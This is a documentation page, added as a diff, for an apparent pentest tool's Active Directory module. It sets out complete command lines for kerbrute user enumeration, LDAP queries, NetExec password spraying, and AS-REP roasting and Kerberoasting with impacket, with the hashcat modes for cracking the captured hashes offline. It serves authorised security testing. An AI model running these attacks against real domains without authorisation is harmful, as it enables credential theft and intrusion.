@@ -1,0 +1,207 @@
+---
+title: "Active Directory Pentesting: Kerberos, LDAP, SMB"
+sidebarTitle: "Active Directory"
+description: "Full AD pentest module: user enumeration with kerbrute, LDAP queries, SMB with NetExec, AS-REP roasting and Kerberoasting via impacket."
+---
+
+Menu option 14 orchestrates the standard Active Directory attack toolkit available on Kali Linux against a target domain controller. It operates in two modes depending on whether credentials are provided, and all discovered users, groups, hashes, and credentials are integrated into the final report under the **Active Directory** section.
+
+<Warning>
+  This module must only be used against Active Directory environments for which you hold explicit written authorisation. Kerberos enumeration and password spraying generate authentication events that are logged by domain controllers and SIEM solutions. Unauthorised use is illegal and may constitute a criminal offence in your jurisdiction.
+</Warning>
+
+<Note>
+  The Active Directory module is skipped in `--batch` mode because it requires interactive prompts (Domain Controller IP, domain name, base DN, and optional credentials). All other modules in a full pentest run normally in batch mode.
+</Note>
+
+---
+
+## Configuration Prompts
+
+When option 14 is selected, the module collects the following inputs interactively:
+
+| Prompt | Default | Notes |
+|--------|---------|-------|
+| IP / FQDN of Domain Controller | Extracted from the target URL hostname | Used for all tool commands |
+| AD Domain FQDN | Derived from the DC hostname | Required for Kerberos and LDAP base DN |
+| Base DN | Auto-generated from domain (`DC=corp,DC=local`) | Overridable |
+| Domain username | Empty (anonymous) | Leave blank for unauthenticated enumeration |
+| Password | Prompted securely with `getpass` | Not echoed to terminal |
+
+---
+
+## Operating Modes
+
+<Tabs>
+  <Tab title="Unauthenticated (Enumeration Only)">
+    When no username is provided, the module runs enumeration-only operations that do not require domain credentials:
+
+    - Kerbrute user enumeration (exploits AS-REQ pre-authentication to test valid usernames without a password)
+    - Anonymous/guest LDAP bind for publicly exposed directory information
+    - NetExec SMB enumeration with null session (`-u "" -p ""`)
+
+    AS-REP Roasting is still available in unauthenticated mode because it exploits accounts with `UF_DONT_REQUIRE_PREAUTH` set — no password is needed to request their AS-REP.
+  </Tab>
+  <Tab title="Authenticated (Full Attack)">
+    When a valid username and password are supplied, all attack modules are available:
+
+    - Authenticated LDAP queries for users, groups, and computers
+    - NetExec SMB enumeration with valid credentials (`--users --groups --shares --pass-pol`)
+    - NetExec password spraying and brute force with `--continue-on-success`
+    - Kerberoasting with `impacket-GetUserSPNs -request` (requires domain credentials)
+    - AS-REP Roasting (available in both modes)
+  </Tab>
+</Tabs>
+
+---
+
+## User Enumeration with Kerbrute
+
+Kerbrute exploits the Kerberos protocol to enumerate valid domain accounts without triggering account lockout (AS-REQ errors are not counted as failed logins by default):
+
+```bash title="Kerbrute userenum command"
+kerbrute userenum \
+  --dc <domain_controller_ip> \
+  -d <domain.local> \
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+Valid users identified by Kerbrute are stored and automatically passed to the AS-REP Roasting and NetExec steps. Each valid user is appended to `FINDINGS` with the `[AD:USER]` prefix.
+
+---
+
+## LDAP Enumeration
+
+LDAP queries are executed via `ldapsearch` against the domain controller. Three queries are issued in sequence, each targeting a different object class:
+
+<Accordion title="User Enumeration">
+  ```bash
+  ldapsearch -x -LLL -H ldap://<dc> \
+    -D user@domain.local -w password \
+    -b "DC=domain,DC=local" \
+    "(&(objectCategory=person)(objectClass=user))" \
+    sAMAccountName userPrincipalName cn displayName \
+    memberOf userAccountControl pwdLastSet lastLogonTimestamp
+  ```
+
+  Results are normalised to `{username, upn, cn, memberOf}` objects. Each user is added to `FINDINGS` with the `[AD:LDAP:USER]` prefix.
+</Accordion>
+
+<Accordion title="Group Enumeration">
+  ```bash
+  ldapsearch -x -LLL -H ldap://<dc> \
+    -b "DC=domain,DC=local" \
+    "(objectClass=group)" \
+    cn description member
+  ```
+
+  Results include group name, description, and member count.
+</Accordion>
+
+<Accordion title="Computer Enumeration">
+  ```bash
+  ldapsearch -x -LLL -H ldap://<dc> \
+    -b "DC=domain,DC=local" \
+    "(objectClass=computer)" \
+    dNSHostName sAMAccountName operatingSystem \
+    operatingSystemVersion lastLogonTimestamp
+  ```
+
+  Computer objects expose operating system names and version strings useful for identifying legacy or unpatched systems.
+</Accordion>
+
+---
+
+## SMB Enumeration and Password Attacks with NetExec
+
+NetExec (`nxc`) is used for both passive SMB enumeration and active credential attacks:
+
+```bash title="SMB enumeration"
+nxc smb <dc_ip> -d <domain> \
+  -u <username> -p <password> \
+  --users --groups --shares --pass-pol
+```
+
+The `--pass-pol` flag retrieves the domain password policy (minimum length, lockout threshold, observation window), which informs how aggressively to run the brute force step.
+
+### Password Spraying / Brute Force
+
+When the user opts in, NetExec runs a credential attack with `--continue-on-success`, meaning the tool does not stop after the first valid credential:
+
+```bash title="NXC password spray"
+nxc smb <dc_ip> -d <domain> \
+  -u <userlist_or_single_user> \
+  -p <passlist_or_single_pass> \
+  --continue-on-success
+```
+
+Valid credentials are parsed from the NetExec output (`[+]` lines) and stored in `SCAN_DATA["active_directory"]["nxc"]["bruteforce"]["credentials"]`.
+
+---
+
+## AS-REP Roasting
+
+Accounts with Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`) respond to AS-REQ requests with an encrypted AS-REP that can be cracked offline. No password is required to request the ticket.
+
+```bash title="impacket-GetNPUsers command"
+impacket-GetNPUsers <domain>/ \
+  -usersfile <valid_users.txt> \
+  -dc-ip <dc_ip> \
+  -format hashcat \
+  -outputfile asrep_hashes.txt
+```
+
+Captured hashes are in `$krb5asrep$23$` Hashcat format (mode 18200), ready for offline cracking. Each roastable account is added to `FINDINGS` with the `[AD:ASREP]` prefix.
+
+---
+
+## Kerberoasting
+
+Service accounts registered with Service Principal Names (SPNs) can have their TGS tickets requested by any authenticated domain user and cracked offline:
+
+```bash title="impacket-GetUserSPNs command"
+impacket-GetUserSPNs <domain>/<username>:<password> \
+  -dc-ip <dc_ip> \
+  -request \
+  -outputfile kerberoast_hashes.txt
+```
+
+Captured TGS hashes are in `$krb5tgs$23$` Hashcat format (mode 13100). Each Kerberoastable SPN is added to `FINDINGS` with the `[AD:KERBEROAST]` prefix.
+
+<Note>
+  Kerberoasting requires domain credentials. If no username and password were provided at the module prompt, this step is automatically skipped.
+</Note>
+
+---
+
+## Recommended Tools
+
+The following tools must be installed and available in `PATH`. On Kali Linux most are available via `apt`:
+
+```bash title="Install AD tools on Kali Linux"
+sudo apt install -y kerbrute ldap-utils netexec impacket-scripts
+```
+
+| Tool | Package | Purpose |
+|------|---------|---------|
+| `kerbrute` | `kerbrute` | Kerberos user enumeration without lockout |
+| `ldapsearch` | `ldap-utils` | LDAP directory queries |
+| `nxc` / `netexec` | `netexec` | SMB enumeration and credential attacks |
+| `impacket-GetNPUsers` | `impacket-scripts` | AS-REP Roasting |
+| `impacket-GetUserSPNs` | `impacket-scripts` | Kerberoasting |
+
+WSTG-Scan checks for each tool at startup and displays a warning for any that are missing, allowing you to install them before continuing.
+
+---
+
+## Findings and Reporting
+
+All Active Directory data is stored under `SCAN_DATA["active_directory"]` and included in every report format. The HTML dashboard renders dedicated tables for:
+
+- Kerbrute valid users
+- LDAP users, groups, and computers
+- AS-REP hashes (username + Hashcat-format hash)
+- Kerberoast hashes (SPN + Hashcat-format hash)
+- NetExec valid credentials
+
+Raw command output is preserved in collapsible `<details>` blocks in the HTML report for full auditability.
